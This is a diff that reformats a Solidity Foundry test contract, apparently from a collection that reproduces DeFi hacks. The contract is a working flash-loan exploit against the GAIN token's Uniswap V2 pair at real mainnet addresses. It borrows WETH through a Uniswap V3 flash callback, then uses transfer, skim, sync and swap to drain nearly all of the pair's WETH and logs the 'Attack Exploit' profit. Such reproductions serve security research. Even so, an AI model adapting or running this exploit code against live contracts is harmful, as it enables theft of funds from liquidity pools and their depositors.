@@ -19,13 +19,11 @@ import {IWETH} from "src/interfaces/IWETH.sol";
 // Hacking God : https://www.google.com/
 
 contract ContractTest is Test {
-    IWETH WETH =
-        IWETH(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
+
+    IWETH WETH = IWETH(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
     IERC20 GAIN = IERC20(0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac);
-    IUniswapV3Pair univ3USDT =
-        IUniswapV3Pair(0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b);
-    IUniswapV2Pair univ2GAIN =
-        IUniswapV2Pair(0x31d80EA33271891986D873B397d849A92EF49255);
+    IUniswapV3Pair univ3USDT = IUniswapV3Pair(0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b);
+    IUniswapV2Pair univ2GAIN = IUniswapV2Pair(0x31d80EA33271891986D873B397d849A92EF49255);
     address[] private addrPath = new address[](2);
     uint256 totalBorrowed = 0.1 ether;
 
@@ -50,11 +48,7 @@ contract ContractTest is Test {
         console.log("Attack Exploit: %s.%s ETH", intRes, decRes);
     }
 
-    function uniswapV3FlashCallback(
-        uint256 fee0,
-        uint256 fee1,
-        bytes memory data
-    ) external {
+    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory data) external {
         WETH.transfer(address(univ2GAIN), totalBorrowed);
         exploitGAIN();
         WETH.transfer(address(univ3USDT), totalBorrowed + fee0);
@@ -70,13 +64,12 @@ contract ContractTest is Test {
         univ2GAIN.skim(address(this));
         univ2GAIN.sync();
         GAIN.transfer(address(univ2GAIN), 130_000_000_000_000);
-        uint256 leave_dust = WETH.balanceOf(address(univ2GAIN)) -
-            WETH.balanceOf(address(univ2GAIN)) /
-            100;
+        uint256 leave_dust = WETH.balanceOf(address(univ2GAIN)) - WETH.balanceOf(address(univ2GAIN)) / 100;
         univ2GAIN.swap(leave_dust, 0, address(this), "");
     }
 
     function approveAll() internal {
         WETH.approve(address(this), type(uint256).max);
     }
+
 }
